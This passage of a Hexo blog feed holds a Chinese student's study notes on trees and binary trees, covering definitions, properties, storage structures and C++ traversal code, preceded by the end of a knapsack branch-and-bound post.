class="hljs-keyword">while</span>(队列不为空)&#123;<br>        Node *current = 单位重量价值最大元素出队<span class="hljs-comment">//扩展结点</span><br> <br>        <span class="hljs-keyword">if</span>(current为叶子结点)&#123;<br>            <span class="hljs-keyword">if</span>(current路径能得到最优值)<br>                更新bestv和bestx;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span>(current的左孩子可行并有可能产生最优解)<br>                左孩子入队<br>            <span class="hljs-keyword">if</span>(current的右孩子有可能产生最优解)<br>                右孩子入队<br>        &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><ahref="https://www.cnblogs.com/yuanqingwen/p/12906285.html">分支限界法0-1背包问题-队列式 - 沅清的小窝 - 博客园 (cnblogs.com)</a></p><blockquote><p>参考：</p><p><ahref="https://www.cnblogs.com/RB26DETT/p/10982687.html">分支限界法解决01背包问题- boobo - 博客园 (cnblogs.com)</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>算法分析与设计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>分支界限法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构 5 树</title>
    <link href="/2023/12/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%205%20%E6%A0%91/"/>
    <url>/2023/12/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%205%20%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312071554974.png"alt="树" /><figcaption aria-hidden="true">树</figcaption></figure><h2 id="树和二叉树的定义">5.1 树和二叉树的定义</h2><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051041647.png" alt="image-20231205104108565" style="zoom:80%;" /></p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051042626.png" alt="树的概述" style="zoom:80%;" /></p><h3 id="树的定义">5.1.1 树的定义</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051044789.png"alt="树的定义" /><figcaption aria-hidden="true">树的定义</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051047068.png"alt="树" /><figcaption aria-hidden="true">树</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051049136.jpg"alt="树的其它表示方式" /><figcaption aria-hidden="true">树的其它表示方式</figcaption></figure><p>比如课本的目录就是凹入表示</p><h3 id="树的基本术语">5.1.2 树的基本术语</h3><p>树的结点(node)： 包含一个数据元素及若干指向其子树的分支</p><p>结点的度(degree)：结点具有子树的个数</p><p>树的度：树中所有结点的度的最大值</p><p>分支结点(或者叫非终端结点)：度大于0的结点，根结点以外的分支节点称为内部结点</p><p>叶子(或者叫终端结点)：度为0的结点</p><p>结点的孩子：结点子树的根，该结点为孩子的双亲</p><p>兄弟：同一双亲的孩子</p><p>堂兄弟：其双亲在同一层的结点间互称堂兄弟</p><p>结点的祖先：从根到该结点所经分支上的所有结点</p><p>结点的子孙：一个结点的所有子树中的结点.</p><p>结点的层次：根为第一层，其孩子结点为第二层，如此类推到每个结点层次</p><p>树的层数(或者叫结点的层次)：根节点的层数为1，其他结点的层数为根节点到该结点的分支数+1</p><p><strong>树的高度(或者叫深度)</strong>：树中结点的最大层数</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051102148.png"alt="树的基本术语" /><figcaption aria-hidden="true">树的基本术语</figcaption></figure><p>A结点的三个孩子：B、C、D</p><p>B、C、D的双亲：A</p><p>D结点的三个孩子：H、I、J</p><p>M结点的祖先：A、D、H</p><p>A结点的子孙：除了A之外的所有结点</p><p>有序树：若将树中结点的各子树看成从左至右是有序的(不能互换)，则称该树为有序树，否则为无序树。</p><p>森林：0个或多个互不相交的树的集合</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051110990.png"alt="image-20231205111033912" /><figcaption aria-hidden="true">image-20231205111033912</figcaption></figure><h3 id="二叉树的定义">5.1.3 二叉树的定义</h3><p>为何要重点研究每结点最多只有两个“叉” 的树？</p><ul><li><p>二叉树的结构最简单，规律性最强</p></li><li><p>可以证明，所有树都能转为唯一对应的二叉树，不失一般性</p></li></ul><p>普通树 (多叉树) 若不转化为二叉树，则运算很难实现</p><p>二叉树在树结构的应用中起着非常重要的作用，因为对二叉的许多操作算法简单，而任何树都可以与二叉树相互转换，这样就解决了树的存储结构及其运算中存在的复杂性</p><p><strong>定义</strong>：二叉树是<spanclass="math inline">\(n(n≥0)\)</span> 个结点的有限集，它或者是空集<spanclass="math inline">\((n=0)\)</span>，或者由一个根结点及两棵互不相交的分别称作这个根的左子树和右子树的二叉树组成</p><p><strong>特点</strong></p><p>1、每个结点最多有俩孩子(二叉树中不存在度大于 2 的结点)</p><p>2、子树有左右之分，其次序不能颠倒<strong>（次序颠倒了就是另外一棵树）</strong></p><p>3、二叉树可以是空集合，根可以有空的左子树或空的右子树</p><p>注⭐：</p><p>二叉树不是树的特殊情况，它们是两个概念</p><p>二叉树结点的子树要区分左子树和右子树，即使只有一棵子树也要进行区分，说明它是左子树，还是右子树</p><p>树当结点只有一个孩子时，就无须区分它是左还是右的次序。因此二者是不同的。这是二又树与树的最主要的差别。</p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051420627.png" alt="具有两个结点的二叉树有两种状态" style="zoom:50%;" /></p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051420636.png" alt="具有两个结点的树只有一种状态" style="zoom:50%;" /></p><p>(也就是二叉树每个结点位置或者说次序都是固定的，可以是空，但是不可以说它没有位置，而树的结点位置是相对于别的结点来说的，没有别的结点时，它就无所谓左右了)，可以理解为二叉树不是树不是有序树，是一个独立的概念</p><p>虽然二叉树与树的概念不同，但有关树的基本术语对二叉树都适用</p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051423517.png" alt="思考" style="zoom:50%;" /></p><p>二叉树的五种基本形态：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051425443.png"alt="二叉树的五种基本形态" /><figcaption aria-hidden="true">二叉树的五种基本形态</figcaption></figure><h2 id="树和二叉树的抽象数据类型定义">5.2树和二叉树的抽象数据类型定义</h2><p>(以二叉树为例来学习)</p><p>二叉树的抽象数据类型定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++">ADT BinaryTree&#123;<br><br>  数据对象 D：具有相同特性的数据元素集合。<br>  数据关系 R：若D为空集，则称为空树。否则R=&#123;H&#125;, H是如下关系：<br>    （<span class="hljs-number">1</span>）在D中存在唯一的称为根的数据元素root；<br>    （<span class="hljs-number">2</span>）若D除了根结点外，D中还有其它结点，则其余结点可分为<span class="hljs-built_in">m</span> (m&gt;<span class="hljs-number">0</span>)个互不相交的有限集T1, T2, …, Tm，其中每一棵子集本身又是一棵符合本定义的树，称为根root的子树。<br>基本操作P:<br>    <br>    <span class="hljs-built_in">CreateBiTree</span>(&amp;T, definition)     <br>    初始条件: definition给出二叉树T的定义<br>        (后面会学二叉树的遍历方法,对于不同的建立方式definition 指的是建立方式)<br>        操作结果: 按definition构造二叉树T<br><span class="hljs-built_in">PreOrderTraverse</span>(T)<br>        初始条件: 二叉树T存在<br>        操作结果: 先序遍历T，对每个结点访问一次<br>    <span class="hljs-built_in">InOrderTraverse</span>(T)<br>        初始条件: 二叉树T存在<br>        操作结果: 中序遍历T，对每个结点访问一次<br>   <span class="hljs-built_in">PostOrderTraverse</span>(T)<br>        初始条件: 二叉树T存在<br>        操作结果: 后序遍历T，对每个结点访问一次<br>……<br>    ……<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="二叉树的性质和存储结构">5.3 二叉树的性质和存储结构</h2><h3 id="基本的性质">5.3.1 基本的性质</h3><p><strong>性质1</strong>：在二叉树的第 <spanclass="math inline">\(i\)</span> 层上至多有<spanclass="math inline">\(2^{i-1}\)</span>个结点<spanclass="math inline">\((i≥1)\)</span></p><p>第一层：<span class="math inline">\(2^0=1\)</span></p><p>第二层：<span class="math inline">\(2^1=2\)</span></p><p>第三层：<span class="math inline">\(2^2=4\)</span></p><p>第四层：<span class="math inline">\(2^3=8\)</span></p><p>……</p><p>提问：第 <span class="math inline">\(i\)</span>层上至少有几个结点？---------1个</p><p><strong>性质2</strong>：深度为 <span class="math inline">\(k\)</span>的二叉树至多有<span class="math inline">\(2^k-1\)</span>个结点<spanclass="math inline">\((k≥1)\)</span></p><p>（都怪第一层只有一个结点</p><p>提问：深度为 <span class="math inline">\(k\)</span>的二叉树至少有几个结点？---------k个</p><p><strong>性质3</strong>：对任何一颗二叉树T，如果其叶子结点数为<spanclass="math inline">\(n_0\)</span>，度为2的结点数为<spanclass="math inline">\(n_2\)</span>，则<spanclass="math inline">\(n_0=n_2+1\)</span>，</p><p>（度为2的结点数又称双分支结点数）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051505422.png"alt="非空二叉树上叶子结点数等于双分支结点数加1" /><figcaptionaria-hidden="true">非空二叉树上叶子结点数等于双分支结点数加1</figcaption></figure><p>性质3的本身的用处其实不是很大，用处大的是我们分析证明的过程</p><h3 id="满二叉树">5.3.2 满二叉树</h3><p>两种特殊形式的二叉树：满二叉树和完全二叉树</p><p>为什么要研究这两种特殊形式？</p><p>——因为它们在顺序存储方式下可以复原</p><p><strong>满二叉树</strong>：</p><p>一棵深度为 <span class="math inline">\(k\)</span> 且有 <spanclass="math inline">\(2^k -1\)</span> 个结点的二叉树称为满二叉树</p><p>即所有分支结点都存在左子树和右子树，并且所有叶子结点都在最底层上，其特点是每一层上的结点数都是最大结点数。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051510897.png"alt="满二叉树" /><figcaption aria-hidden="true">满二叉树</figcaption></figure><p>对满二叉树结点位置进行编号：</p><ul><li>编号规则：从根结点开始，自上而下，自左而右。</li><li>每一结点位置都有元素</li></ul><p>满二叉树在同样深度的二叉树中结点个数最多</p><p>满二叉树在同样深度的二叉树中叶子结点个数最多</p><h3 id="完全二叉树">5.3.3 完全二叉树</h3><p><strong>完全二叉树</strong>：</p><p>深度为k，有n个结点的二叉树，当且仅当其每一个结点都与深度为k的满二叉树中<strong>编号从1至n的结点一一对应</strong>时，称之为完全二叉树。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051516842.png"alt="完全二叉树例子" /><figcaption aria-hidden="true">完全二叉树例子</figcaption></figure><p>注：在满二叉树中，从最后一个结点开始，连续去掉任意个结点，即是一棵完全二叉树</p><p>一定是连续的去掉！！！</p><p>特点：</p><p>（1）叶子结点只可能在层次最大的两层上出现，即最下层和次最下层；</p><p>（2）对任一结点，如果其右子树的最大层次为 <spanclass="math inline">\(i\)</span>，则其左子树的最大层次必为 <spanclass="math inline">\(i\)</span> 或 <spanclass="math inline">\(i+1\)</span>，即最下层的叶子结点集中在树的左部。</p><h3 id="完全二叉树的性质">5.3.4 完全二叉树的性质</h3><p><strong>性质4</strong>：具有n个结点的完全二叉树的深度为 <spanclass="math inline">\(\lfloor log_2n \rfloor+1\)</span></p><p>注意：<span class="math inline">\(\lfloor x\rfloor\)</span>：称作x的底，表示不大于x的最大整数（向下取整），例如：<spanclass="math inline">\(\lfloor 3.5 \rfloor=3\)</span></p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051528063.png" alt="性质4" style="zoom:50%;" /></p><p>比如上图，<spanclass="math inline">\(n=12\)</span>，所以完全二叉树的深度为 <spanclass="math inline">\(\lfloor log_212 \rfloor+1=4\)</span></p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051531812.png" alt="性质4证明" style="zoom:80%;" /></p><p><strong>性质5</strong>：对有n个结点的完全二叉树的结点按层序编号(从上至下，从左至右)，则<strong>对任一结点<span class="math inline">\(i(1≤ i≤n)\)</span></strong> ，有：</p><ul><li>如果<span class="math inline">\(i=1\)</span>，则结点为根；如果<spanclass="math inline">\(i&gt;1\)</span>，则其<strong>双亲是结点<spanclass="math inline">\(\lfloor i/2 \rfloor\)</span></strong></li><li>如果 <span class="math inline">\(2i&gt;n\)</span>，则结点 <spanclass="math inline">\(i\)</span>为叶子结点，无左孩子；否则其<strong>左孩子是结点 <spanclass="math inline">\(2i\)</span></strong></li><li>如果 <span class="math inline">\(2i+1&gt;n\)</span>，则结点 <spanclass="math inline">\(i\)</span>为叶子结点，无右孩子；否则其<strong>右孩子是结点 <spanclass="math inline">\(2i+1\)</span></strong></li></ul><p>这里大部分情况下就只看标粗的部分，</p><p>举例：5，双亲是<span class="math inline">\(\lfloor 5/2\rfloor=2\)</span>，左孩子是结点 <spanclass="math inline">\(2*5=10\)</span>，右孩子是结点 <spanclass="math inline">\(2*5+1=11\)</span>，，就是这么easy的性质</p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051539780.png" alt="image-20231205153905734" style="zoom:80%;" /></p><p>性质5表明了完全二叉树中双亲结点编号与孩子结点编号之间的关系</p><p>具体证明先不用了解</p><p>作用：在顺序存储的时候，操作下标为i的结点的双亲或者后继的时候</p><h3 id="二叉树的存储结构">5.3.5 二叉树的存储结构</h3><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051544960.png" alt="二叉树的存储结构" style="zoom:50%;" /></p><h4 id="二叉树的顺序存储">二叉树的顺序存储</h4><p>实现：按满二叉树的结点层次编号，依次存放二叉树中的数据元素</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051554301.png"alt="二叉树的顺序存储例子" /><figcaption aria-hidden="true">二叉树的顺序存储例子</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//二叉树顺序存储表示，Binary Tree</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXTSIZE 100</span><br>Typedef TELemType SqBiTree[MAXTSIZE]; <span class="hljs-comment">//TELemType根据具体情况换，比如char、int</span><br>SqBiTree bt; <span class="hljs-comment">//定义了一个数组bt</span><br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051559459.png"alt="二叉树的顺序存储例子2" /><figcaption aria-hidden="true">二叉树的顺序存储例子2</figcaption></figure><p>其实这里不是给0，是给一个空值NULL，</p><p>优点：简单</p><p>缺点：</p><p>①顺序存储通用的缺点：大小固定，数组中元素个数变化特别大，就不适用了</p><p>② 对二叉树的存储，还有一个缺点：</p><p>本来顺序存储的存储密度可以达到1，因为它只存数据元素本身，存储密度很大，但对于二叉树，为了描绘出双亲和孩子的关系，必须把对应的元素放到对应的位置，导致必须空一些元素，导致了空间的浪费</p><p><img src="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051604892.png" alt="二叉树的顺序存储的缺点" style="zoom:80%;" /></p><p>后面的堆排序其实就用这种方法存取</p><h4 id="二叉树的链式存储结构">二叉树的链式存储结构</h4><p>（1）二叉链表存储（含有两个指针域的结点结构）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051611367.png"alt="二叉链表存储结构" /><figcaption aria-hidden="true">二叉链表存储结构</figcaption></figure><p>链表中的每个结点由三个域组成：数据域、左指针域、右指针域，其形式定义如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiNode</span> &#123;   <span class="hljs-comment">// 结点结构</span><br>TElemType data;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">BiTNode</span> *lchild, *rchild;   <span class="hljs-comment">// 左右孩子指针，定义是典中之典的递归定义，跟定义单链表一样</span><br>&#125;BiNode, *BiTree; <br><span class="hljs-comment">//为了用起来方便，又typedef，定义了一个普通的结点类型BiNode，定义了一个指向这种有三个成员的结点类型的指针*BiTree</span><br><br></code></pre></td></tr></table></figure><blockquote><p>如果操作经常要操作结点的后继（左右孩子），可以用这种存储结构</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051616645.png"alt="二叉链表存储" /><figcaption aria-hidden="true">二叉链表存储</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051621657.png"alt="小性质喵" /><figcaption aria-hidden="true">小性质喵</figcaption></figure><blockquote><p>这里的小性质学到线索二叉树会用，这些空的指针域还可以利用起来</p></blockquote><p>（2）三叉链表存储（含有三个指针域的结点结构）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051626786.png"alt="三叉链表存储结构" /><figcaption aria-hidden="true">三叉链表存储结构</figcaption></figure><p>每个结点由四个域组成：数据域、左指针域、右指针域和双亲域，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//形式定义如下:</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TriTNode</span> &#123;<br>TElemType data;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TriTNode</span>  *lchild, *rchild; <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">TriTNode</span>  *parent;  <span class="hljs-comment">//双亲指针  </span><br>&#125; TriTNode, *TriTree;<br></code></pre></td></tr></table></figure><blockquote><p>如果操作经常要操作结点的前驱，可以用这种存储结构</p></blockquote><p>双亲指针就是指向它的前驱结点，大部分数据结构中的图都画的乱七八糟，不用管</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051632647.png"alt="三叉链表存储" /><figcaption aria-hidden="true">三叉链表存储</figcaption></figure><h2 id="遍历二叉树">⭐5.4 遍历二叉树</h2><h3 id="遍历二叉树概述">5.4.1 遍历二叉树概述</h3><p>遍历定义：顺着某一条搜索路径巡访二叉树中的结点，使得每个结点均被访问一次，而且仅被访问一次(又称周游)</p><ul><li>”访问”的含义很广，可以是对结点作各种处理，如：输出结点的信息、修改结点的数据值等，但要求这种访问不破坏原来的数据结构，即不插入结点和删除结点</li></ul><p>遍历目的：得到树中所有结点的一个线性排列</p><p>遍历用途：它是树结构插入、删除、修改、查找和排序运算的前提，是二叉树一切运算的基础和核心。</p><p>遍历方法：</p><ul><li>依次遍历二叉树中的三个组成部分，便是遍历了整个二叉树</li><li>假设：L：遍历左子树，D：访问根结点，R：遍历右子树，则遍历整个二叉树方案共有：DLR、LDR、LRD、DRL、RDL、RLD</li></ul><p>若规定先左后右，则只有前三种情况</p><p>DLR——先(根) 序遍历</p><p>LDR——中(根) 序遍历</p><p>LRD——后(根) 序遍历</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312051751563.png"alt="遍历二叉树方法" /><figcaption aria-hidden="true">遍历二叉树方法</figcaption></figure><h4 id="先序遍历-dlr">5.4.1.1 先序遍历-DLR</h4><p>若二叉树为空，则空操作；否则：</p><ol type="1"><li>先访问根结点</li><li>再先序遍历左子树</li><li>最后先序遍历右子树</li></ol><p>访问二叉树中所有结点，且每个结点只访问一次</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312052037066.png"alt="先序遍历-DLR例子" /><figcaption aria-hidden="true">先序遍历-DLR例子</figcaption></figure><h4 id="中序遍历-ldr">5.4.1.2 中序遍历-LDR</h4><p>若二叉树为空，则空操作；否则：</p><ol type="1"><li>中序遍历左子树</li><li>访问根结点</li><li>中序遍历右子树</li></ol><p>例子：还是上面的图：E L B A M H I D J</p><h4 id="后序遍历-lrd">5.4.1.3 后序遍历-LRD</h4><p>若二叉树为空，则空操作；否则：</p><ol type="1"><li>后序遍历左子树</li><li>后序遍历右子树</li><li>访问根结点</li></ol><p>例子：还是上面的图：L E B M I H J D A</p><h3 id="根据遍历序列确定二叉树">5.4.2 根据遍历序列确定二叉树</h3><ul><li><p>若二叉树中各结点的值均不同，则二叉树结点的先序序列、中序序列和后序序列都是唯一的</p></li><li><p>由中序和先序，或中序和后序遍历序列可以唯一确定一棵二叉树</p><p>但由先序和后序遍历不能唯一确定一棵二叉树。因为对二叉树的先序和后序遍历序列来说，无法根据根结点唯一地划分出左子树和右子树的遍历序列，因此也就不能唯一确定这棵二叉树，除非二叉树为空二叉树或只有一个结点。</p></li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312052053118.png"alt="根据遍历序列确定二叉树" /><figcaption aria-hidden="true">根据遍历序列确定二叉树</figcaption></figure><h3 id="二叉树遍历的递归算法">5.4.3 二叉树遍历的递归算法</h3><p>实现一个算法前先确定存储结构一一二叉链表（通过指针T访问根节点）</p><p><strong>先序遍历算法</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//二叉树先序遍历，递归算法</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">至于这里为什么是Status，我现在是这样理解的：</span><br><span class="hljs-comment">这里面有个状态码返回，所以void不行，一般也确实需要状态码来确定是否成功执行，所以挺有用的，想用void看下一个代码</span><br><span class="hljs-comment">等后面代码实现的时候验证一下~</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function">Status <span class="hljs-title">PreOrderTraverse</span><span class="hljs-params">(BiTree T)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> OK;<span class="hljs-comment">//空二叉树</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">visit</span>(T); <span class="hljs-comment">//访问根结点，visit函数自己定义，看你的访问需求是什么</span><br>        <span class="hljs-built_in">PreOrderTraverse</span>(T-&gt;lchild); <span class="hljs-comment">//递归遍历左子树，递归调用进入下一层了</span><br>        <span class="hljs-built_in">PreOrderTraverse</span>(T-&gt;rchild); <span class="hljs-comment">//递归遍历右子树</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//这个是用void的</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">preorderTraverse</span><span class="hljs-params">(BiTree T)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (T)&#123;<br>        <span class="hljs-built_in">printf</span>(T-&gt;data);<br>        <span class="hljs-built_in">preorderTraverse</span>(T-&gt;lchild);<br>        <span class="hljs-built_in">preorderTraverse</span>(T-&gt;rchild);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>递归调用中具体的执行过程：</p><blockquote><p>这里看弹幕讨论BiTree <em>T 有错误，不应该带</em>，这里等我写代码的时候实践一下看看</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312052258026.png"alt="递归调用中具体的执行过程" /><figcaption aria-hidden="true">递归调用中具体的执行过程</figcaption></figure><p><strong>中序遍历算法</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312052301466.png"alt="中序遍历算法" /><figcaption aria-hidden="true">中序遍历算法</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//二叉树中序遍历，递归算法</span><br><span class="hljs-function">Status <span class="hljs-title">InOrderTraverse</span><span class="hljs-params">(BiTree T)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> OK;<span class="hljs-comment">//空二叉树</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">InOrderTraverse</span>(T-&gt;lchild); <span class="hljs-comment">//递归遍历左子树</span><br>        <span class="hljs-built_in">visit</span>(T); <span class="hljs-comment">//访问根结点</span><br>        <span class="hljs-built_in">InOrderTraverse</span>(T-&gt;rchild); <span class="hljs-comment">//递归遍历右子树</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>后序遍历算法</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//二叉树后序遍历，递归算法</span><br><span class="hljs-function">Status <span class="hljs-title">PostOrderTraverse</span><span class="hljs-params">(BiTree T)</span></span>&#123;<br>    <span class="hljs-keyword">if</span> (T == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> OK;<span class="hljs-comment">//空二叉树</span><br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">PostOrderTraverse</span>(T-&gt;lchild); <span class="hljs-comment">//递归遍历左子树</span><br>        <span class="hljs-built_in">PostOrderTraverse</span>(T-&gt;rchild); <span class="hljs-comment">//递归遍历右子树</span><br>        <span class="hljs-built_in">visit</span>(T); <span class="hljs-comment">//访问根结点</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>遍历算法的分析</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312052306327.png"alt="遍历算法的分析" /><figcaption aria-hidden="true">遍历算法的分析</figcaption></figure><p>时间复杂度：<span class="math inline">\(O(3n)=O(n)\)</span></p><p>空间复杂度：<spanclass="math inline">\(O(n)\)</span>，栈占用的最大辅助空间</p><p>解释：栈要记录下，虽然我路过它了，但是没有访问，记录下这个结点，访问之后就能从栈中拿出来，最坏的情况下单支的树，每个结点路过的时候都不访问，要存储n个结点</p><h3 id="二叉树遍历的非递归算法">5.4.4 二叉树遍历的非递归算法</h3><p>以中序遍历非递归算法为例</p><blockquote><p>当遇到根的时候不能访问，先遍历左子树，遍历完左子树之后回来还能找到它，那就需要一个地方把这个根存起来</p></blockquote><p>二叉树中序遍历的非递归算法的关键：在中序遍历过某结点的整个左子树后，如何找到该结点的根以及右子树</p><p>基本思想：</p><ol type="1"><li>建立一个栈</li><li>根结点进栈，遍历左子树</li><li>根结点出栈，输出根结点，遍历右子树</li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312052326364.gif"alt="中序遍历非递归算法gif" /><figcaption aria-hidden="true">中序遍历非递归算法gif</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//中序遍历非递归算法，二叉链表上实现</span><br><span class="hljs-function">Status <span class="hljs-title">InorderTraverse</span><span class="hljs-params">(BiTree T)</span></span>&#123;<br>    BiTree p,q;<br>    P=T;  <span class="hljs-comment">//要操作的结点，指针变量p表示，初值指向根结点</span><br>    <span class="hljs-built_in">InitStack</span>(S);  <span class="hljs-comment">//初始化栈</span><br>    <span class="hljs-keyword">while</span> (P||!<span class="hljs-built_in">StackEmpty</span>(S))&#123;<br>        <span class="hljs-keyword">if</span> (P)&#123;<br>            <span class="hljs-built_in">Push</span>(S, p);  <span class="hljs-comment">//不为空，就当前根结点入栈</span><br>            q = p; <br>            p = p-&gt;lchild;<span 